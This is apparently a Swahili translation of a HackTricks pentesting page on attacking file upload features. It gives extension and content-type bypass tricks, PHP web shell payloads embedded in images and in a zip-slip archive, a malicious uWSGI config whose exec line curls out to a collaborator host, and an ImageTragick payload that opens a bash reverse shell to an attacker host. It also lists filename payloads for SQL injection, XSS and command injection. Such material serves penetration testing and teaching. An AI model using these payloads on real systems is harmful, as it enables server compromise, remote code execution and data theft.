# Kuleta Faili

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Mshahara wa mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la **mshahara wa mdudu wa premium lililoundwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata mshahara hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Mbinu ya Jumla ya Kuleta Faili

Vifaa vingine muhimu:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Kufanya kazi katika PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Kuepuka ukaguzi wa nyongeza za faili

1. Ikiwa zinatumika, **angalia** nyongeza **zilizotangulia.** Jaribu pia kuzipima kwa kutumia herufi **kubwa**: _pHp, .pHP5, .PhAr ..._
2. _Angalia **kuongeza nyongeza halali kabla** ya nyongeza ya utekelezaji (tumia nyongeza zilizotangulia pia):_
* _file.png.php_
* _file.png.Php5_
3. Jaribu kuongeza **herufi maalum mwishoni.** Unaweza kutumia Burp kufanya **bruteforce** ya herufi zote za **ascii** na **Unicode**. (_Kumbuka kuwa unaweza pia kujaribu kutumia **nyongeza zilizotangulia**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Jaribu kuepuka ulinzi kwa **kudanganya kisomaji cha nyongeza** cha upande wa seva na mbinu kama **kuzidisha** nyongeza au kuongeza data **taka** (baiti tupu) kati ya nyongeza. _Unaweza pia kutumia **nyongeza zilizotangulia** kuandaa mzigo bora._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Ongeza **safu nyingine ya nyongeza** kwa ukaguzi uliotangulia:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Jaribu kuweka **nyongeza ya utekelezaji kabla ya nyongeza halali** na omba ili seva iwe imepangwa vibaya. (inatumika kudukua mazingira yaliyopangwa vibaya ya Apache ambapo chochote chenye nyongeza ya **.php**, lakini **sio lazima iishie na .php** itatekeleza nambari):
* _mfano: file.php.png_
7. Kutumia **NTFS alternate data stream (ADS)** katika **Windows**. Katika kesi hii, herufi ya mkato ":", itawekwa baada ya nyongeza iliyokatazwa na kabla ya ile iliyoruhusiwa. Kama matokeo, faili tupu yenye nyongeza iliyokatazwa itaundwa kwenye seva (kwa mfano, "file.asax:.jpg"). Faili hii inaweza kuhaririwa baadaye kwa kutumia mbinu zingine kama kutumia jina lake fupi. Kielelezo cha "**::$data**" pia kinaweza kutumika kuunda faili zisizo tupu. Kwa hivyo, kuongeza herufi ya dot baada ya kielelezo hiki pia kunaweza kuwa na manufaa kuepuka vizuizi zaidi (kwa mfano, "file.asp::$data.")
8. Jaribu kuvunja mipaka ya jina la faili. Nyongeza halali inakatwa. Na PHP mbaya inabaki. AAA<--SNIP-->AAA.php

```
# Linux kiwango cha juu cha herufi 255
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # punguza 4 hapa na ongeza .png
# Pakia faili na angalia majibu ni herufi ngapi inaruhusu. Hebu sema 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Unda mzigo
AAA<--SNIP 232 A-->AAA.php.png
```
### Kuepuka Uthibitisho wa Aina ya Yaliyomo, Nambari ya Ajabu, Ufupishaji na Upya Ukubwa

* Kuepuka uthibitisho wa aina ya yaliyomo kwa kuweka thamani ya kichwa cha aina ya yaliyomo kuwa: _image/png_, _text/plain_, application/octet-stream_
1. Orodha ya maneno ya aina ya yaliyomo: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Kuepuka uthibitisho wa nambari ya ajabu kwa kuongeza kwenye mwanzo wa faili **bayti za picha halisi** (kuchanganya amri ya _file_). Au weka kabati ndani ya **metadata**:\
`exiftool -Comment="<?php echo 'Amri:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` au unaweza pia **weka mzigo moja kwa moja** kwenye picha:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Ikiwa **ufupishaji unafanywa kwenye picha yako**, kwa mfano kwa kutumia maktaba za PHP kama [PHP-GD](https://www.php.net/manual/fr/book.image.php), mbinu za awali hazitakuwa na maana. Walakini, unaweza kutumia **kitengo cha PLTE** [**mbinu iliyoelezwa hapa**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **kupitia ufupishaji**.
* [**Github na nambari**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Ukurasa wa wavuti pia unaweza **kupunguza ukubwa** wa **picha**, kwa kutumia kwa mfano kazi za PHP-GD `imagecopyresized` au `imagecopyresampled`. Walakini, unaweza kutumia **kitengo cha IDAT** [**mbinu iliyoelezwa hapa**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **kupitia ufupishaji**.
* [**Github na nambari**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Mbinu nyingine ya kuunda mzigo ambao **utapitia upya ukubwa wa picha**, kwa kutumia kazi ya PHP-GD `thumbnailImage`. Walakini, unaweza kutumia **kitengo cha tEXt** [**mbinu iliyoelezwa hapa**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **kupitia ufupishaji**.
* [**Github na nambari**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Mbinu Nyingine za Kuchunguza

* Tafuta udhaifu wa **kubadilisha jina** la faili tayari iliyopakiwa (kubadilisha kifungu).
* Tafuta udhaifu wa **Uingizaji wa Faili ya Ndani** ili kutekeleza mlango wa nyuma.
* **Ufunuo wa Taarifa Inayowezekana**:
1. Pakia **mara kadhaa** (na **wakati huo huo**) **faili ile ile** na **jina lile lile**
2. Pakia faili na **jina** la **faili** au **folda** ambayo **tayari ipo**
3. Pakia faili na jina la **‚Äú.‚Äù, ‚Äú..‚Äù, au ‚Äú‚Ä¶‚Äù**. Kwa mfano, kwenye Apache kwenye **Windows**, ikiwa programu inahifadhi faili zilizopakiwa kwenye saraka ya ‚Äú/www/uploads/‚Äù, jina la faili ‚Äú.‚Äù litasababisha faili iitwayo ‚Äúuploads‚Äù katika saraka ya ‚Äú/www/‚Äù.
4. Pakia faili ambayo haiwezi kufutwa kwa urahisi kama vile **‚Äú‚Ä¶:.jpg‚Äù** katika **NTFS**. (Windows)
5. Pakia faili kwenye **Windows** yenye herufi **batili** kama vile `|<>*?‚Äù` kwenye jina lake. (Windows)
6. Pakia faili kwenye **Windows** ukitumia majina **yaliyohifadhiwa** (yaliyokatazwa) kama vile CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, na LPT9.
* Jaribu pia kupakia faili ya **utekelezaji** (.exe) au **.html** (isiyo na shaka) ambayo **itatekeleza nambari** wakati inafunguliwa kimakosa na muathiriwa.

### Mbinu Maalum za Nyongeza

Ikiwa unajaribu kupakia faili kwenye seva ya **PHP**, [tazama mbinu ya **.htaccess** ya kutekeleza nambari](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Ikiwa unajaribu kupakia faili kwenye seva ya **ASP**, [tazama mbinu ya **.config** ya kutekeleza nambari](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Faili za `.phar` ni kama `.jar` kwa Java, lakini kwa PHP, na zinaweza **kutumiwa kama faili ya PHP** (kuitekeleza na PHP, au kuiingiza ndani ya skripti...)

Ugani wa `.inc` mara nyingi hutumiwa kwa faili za PHP ambazo hutumiwa tu ku **ingiza faili**, kwa hivyo, kwa wakati fulani, mtu angeweza kuruhusu **ugani huu kutekelezwa**.

## **Jetty RCE**

Ikiwa unaweza kupakia faili ya XML kwenye seva ya Jetty, unaweza kupata [RCE kwa sababu **faili za \*.xml na \*.war zinafanyiwa kazi moja kwa moja**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Kwa hivyo, kama ilivyotajwa kwenye picha ifuatayo, pakia faili ya XML kwenye `$JETTY_BASE/webapps/` na tumaini kupata kifaa cha kuingia!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Kwa uchunguzi wa kina wa udhaifu huu, angalia utafiti asili: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Udhaifu wa Utekelezaji wa Amri Kijijini (RCE) unaweza kutumiwa kwenye seva za uWSGI ikiwa mtu ana uwezo wa kurekebisha faili ya usanidi ya `.ini`. Faili za usanidi za uWSGI hutumia sintaksia maalum kuunganisha "vigezo vya uchawi", nafasi za kujaza, na waendeshaji. Hasa, waendeshaji wa '@', unaoitwa `@(jina la faili)`, umebuniwa kuweka maudhui ya faili. Kati ya mipango mbalimbali inayoungwa mkono katika uWSGI, mpango wa "exec" ni hasa wenye nguvu, kuruhusu kusoma data kutoka kwa pato la kawaida la mchakato. Kipengele hiki kinaweza kubadilishwa kwa madhumuni mabaya kama Utekelezaji wa Amri Kijijini au Kuandika/Soma Faili za Kiholela wakati faili ya usanidi ya `.ini` inapopitiwa.

Fikiria mfano ufuatao wa faili ya `uwsgi.ini` yenye madhara, ikionyesha mipango mbalimbali:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Utekelezaji wa mzigo hufanyika wakati wa kuchambua faili ya usanidi. Ili usanidi uweze kuamilishwa na kuchambuliwa, mchakato wa uWSGI lazima uanzishwe tena (labda baada ya kushindwa au kutokana na shambulio la Kukataa Huduma) au faili lazima iwe imewekwa kwa kurejesha moja kwa moja. Kipengele cha kurejesha moja kwa moja, ikiwa imeamilishwa, hurejesha faili kwa vipindi vilivyowekwa baada ya kugundua mabadiliko.

Ni muhimu kuelewa uangalifu wa kuchambua faili ya usanidi ya uWSGI. Hasa, mzigo uliojadiliwa unaweza kuingizwa katika faili ya binary (kama picha au PDF), kuongeza wigo wa uwezekano wa unyanyasaji.

## **Mbinu ya Kupakia Faili/Trick ya SSRF ya wget**

Katika hali fulani, unaweza kugundua kuwa seva inatumia **`wget`** kupakua faili na unaweza **kuonyesha** **URL**. Katika kesi hizi, nambari inaweza kuwa inathibitisha kuwa kipengee cha kupakuliwa kina kizuizi cha kuwa ndani ya orodha nyeupe ili kuhakikisha kuwa faili zinazoruhusiwa tu zitapakuliwa. Walakini, **ukaguzi huu unaweza kuzungukwa.**\
Urefu **maksimumu** wa **jina la faili** katika **linux** ni **255**, hata hivyo, **wget** hukata majina ya faili hadi wahusika **236**. Unaweza **kupakua faili iliyoitwa "A"\*232+".php"+".gif"**, jina hili la faili litapita **ukaguzi** (kama katika mfano huu **".gif"** ni kipengee **halali**) lakini `wget` itaifanyia faili jina kuwa **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Tafadhali kumbuka **chaguo jingine** unaloweza kufikiria kwa kuepuka ukaguzi huu ni kufanya **seva ya HTTP kuhamisha kwa faili tofauti**, hivyo URL ya awali itapita ukaguzi kwa wakati huo wget itapakua faili iliyohamishwa na jina jipya. Hii **haitafanya kazi** **isipokuwa** wget inatumika na **parameter** `--trust-server-names` kwa sababu **wget itapakua ukurasa uliohamishwa na jina la faili iliyotajwa katika URL ya awali**.


## Zana

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) ni zana yenye nguvu iliyoundwa kusaidia Pentesters na Bug Hunters katika kupima mifumo ya kupakia faili. Inatumia mbinu mbalimbali za bug bounty ili kusimplify mchakato wa kutambua na kutumia udhaifu, kuhakikisha tathmini kamili ya programu za wavuti.

## Kutoka Kupakia Faili hadi Udhaifu Mwingine

* Weka **jina la faili** kuwa `../../../tmp/lol.png` na jaribu kufikia **path traversal**
* Weka **jina la faili** kuwa `sleep(10)-- -.jpg` na labda utaweza kufikia **SQL injection**
* Weka **jina la faili** kuwa `<svg onload=alert(document.domain)>` ili kufikia XSS
* Weka **jina la faili** kuwa `; sleep 10;` ili kujaribu injection ya amri fulani (zaidi [tricks za injection ya amri hapa](../command-injection.md))
* [**XSS** katika kupakia faili ya picha (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Kupakia faili ya **JS** + **XSS** = [Udanganyifu wa Wafanyakazi wa Huduma](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE katika kupakia svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** kupitia kupakia faili ya svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Jaribu **payloads tofauti za svg** kutoka [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Udhaifu maarufu wa **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Ikiwa unaweza **kuashiria seva ya wavuti kuchukua picha kutoka kwenye URL**, unaweza kujaribu kutumia [SSRF](../ssrf-server-side-request-forgery/). Ikiwa **picha** hii itakuwa **imehifadhiwa** katika tovuti ya **umma**, unaweza pia kuashiria URL kutoka [https://iplogger.org/invisible/](https://iplogger.org/invisible/) na **kuiba habari ya kila mtembeleaji**.
* [**XXE na CORS** bypass na kupakia PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDF zilizoundwa maalum kwa XSS: [Ukurasa ufuatao unaonyesha jinsi ya **kuingiza data ya PDF ili kupata utekelezaji wa JS**](../xss-cross-site-scripting/pdf-injection.md). Ikiwa unaweza kupakia PDF unaweza kuandaa PDF ambayo itatekeleza JS ya kiholela kufuatia maelekezo yaliyotolewa.
* Pakia yaliyomo ya \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) ili kuchunguza ikiwa seva ina **antivirus**
* Angalia ikiwa kuna **kikomo cha ukubwa** wa kupakia faili

Hapa kuna orodha ya 10 ya vitu unavyoweza kufikia kwa kupakia (kutoka [hapa](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magic Header Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Rejea [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) kwa aina nyingine za faili.

### Kupakia Faili ya Zip/Tar Inayodekompresiwa Kiotomatiki

Ikiwa unaweza kupakia ZIP ambayo itaendelea kudekompresiwa ndani ya seva, unaweza kufanya mambo 2:

#### Symlink

Pakia kiungo kinachojumuisha viungo vya laini kwa faili zingine, kisha, kwa kufikia faili zilizodekompresiwa utafikia faili zilizounganishwa:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Kufungua faili katika folda tofauti

Uumbaji usiotarajiwa wa faili katika folda wakati wa kufungua ni tatizo kubwa. Ingawa kwa kawaida inadhaniwa kuwa hii inaweza kuzuia utekelezaji wa amri za ngazi ya OS kupitia kupakia faili zenye nia mbaya, msaada wa kihierarkia wa kubana na uwezo wa kuvuka folda wa muundo wa faili za ZIP unaweza kutumiwa vibaya. Hii inaruhusu wadukuzi kukiuka vizuizi na kutoroka kutoka kwenye folda salama za kupakia kwa kubadilisha utendaji wa kufungua faili za programu inayolengwa.

Exploit otomatiki ya kuunda faili kama hizo inapatikana kwenye [**evilarc kwenye GitHub**](https://github.com/ptoomey3/evilarc). Zana hii inaweza kutumika kama inavyoonyeshwa:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Kwa kuongezea, **mtego wa symlink na evilarc** ni chaguo. Ikiwa lengo ni kulenga faili kama vile `/flag.txt`, symlink kwa faili hiyo inapaswa kuundwa kwenye mfumo wako. Hii inahakikisha kuwa evilarc haikumbani makosa wakati wa uendeshaji wake.

Hapa chini ni mfano wa nambari ya Python inayotumiwa kuunda faili ya zip yenye nia mbaya:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Kutumia ujazo kwa kusambaza faili**

Kwa maelezo zaidi **angalia chapisho la asili katika**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Kuunda Shell ya PHP**:
Nambari ya PHP imeandikwa ili kutekeleza amri zilizopitishwa kupitia kipengele cha `$_REQUEST`.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Kusambaza Faili na Kuunda Faili Iliyofungwa**:
Faili nyingi zinaundwa na kiunzi cha zip kinakusanywa kinao na faili hizi.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Kurekebisha kwa Kutumia Mhariri wa Hex au vi**:
Majina ya faili ndani ya zip yanabadilishwa kwa kutumia vi au mhariri wa hex, kubadilisha "xxA" kuwa "../" ili kusafiri kwenye saraka.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Pakia maudhui haya na kipengele cha picha ili kutumia udhaifu **(ImageMagick, 7.0.1-1)**
(kutoka kwa [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Kuingiza PHP Shell kwenye PNG

Kuingiza PHP shell kwenye kipande cha IDAT cha faili ya PNG kunaweza kuepuka kwa ufanisi baadhi ya shughuli za usindikaji wa picha. Kazi za `imagecopyresized` na `imagecopyresampled` kutoka PHP-GD ni muhimu sana katika muktadha huu, kwani mara nyingi hutumiwa kwa kurekebisha ukubwa na kurejesha sampuli za picha, mtawalia. Uwezo wa PHP shell iliyowekwa kubaki bila athari kutokana na shughuli hizi ni faida kubwa kwa matumizi fulani.

Utafiti wa kina wa mbinu hii, pamoja na njia yake ya kufanya kazi na matumizi yake yanayowezekana, umeelezwa kwa undani katika makala ifuatayo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Rasilimali hii inatoa ufahamu kamili wa mchakato huo na athari zake.

Maelezo zaidi katika: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Faili za Polyglot

Faili za polyglot ni zana ya kipekee katika usalama wa mtandao, zikifanya kazi kama kinyonga ambazo zinaweza kuwepo kwa halali katika muundo wa faili mbalimbali kwa wakati mmoja. Mfano wa kuvutia ni [GIFAR](https://en.wikipedia.org/wiki/Gifar), ambayo ni mchanganyiko wa GIF na faili ya RAR. Aina kama hizo za faili haziko tu kwenye mchanganyiko huu; mchanganyiko kama GIF na JS au PPT na JS pia ni wa kufikirika.

Faida kuu ya faili za polyglot ni uwezo wao wa kuzunguka hatua za usalama ambazo huchunguza faili kulingana na aina yake. Mazoea ya kawaida katika programu mbalimbali ni kuruhusu aina fulani za faili kupakiwa, kama vile JPEG, GIF, au DOC, ili kupunguza hatari inayoweza kusababishwa na muundo wa faili zenye madhara (k.m., JS, PHP, au faili za Phar). Walakini, faili ya polyglot, kwa kufuata vigezo vya muundo wa aina mbalimbali za faili, inaweza kuepuka vizuizi hivi kwa siri.

Licha ya uwezo wao wa kubadilika, faili za polyglot zinakabiliwa na mipaka. Kwa mfano, wakati faili ya polyglot inaweza kuwa na muundo wa faili ya PHAR (PHp ARchive) na JPEG kwa wakati mmoja, mafanikio ya kupakia kwake yanaweza kutegemea sera za kikoa kuhusu viendelezi vya faili. Ikiwa mfumo ni mkali kuhusu viendelezi vinavyoruhusiwa, uwiano tu wa kimuundo wa faili ya polyglot huenda usitoshe kuhakikisha kupakia kwake.

Maelezo zaidi katika: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Marejeo

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Mshauri wa tuzo ya mdudu**: **Jisajili** kwa **Intigriti**, jukwaa la tuzo ya mdudu la malipo, lililoanzishwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
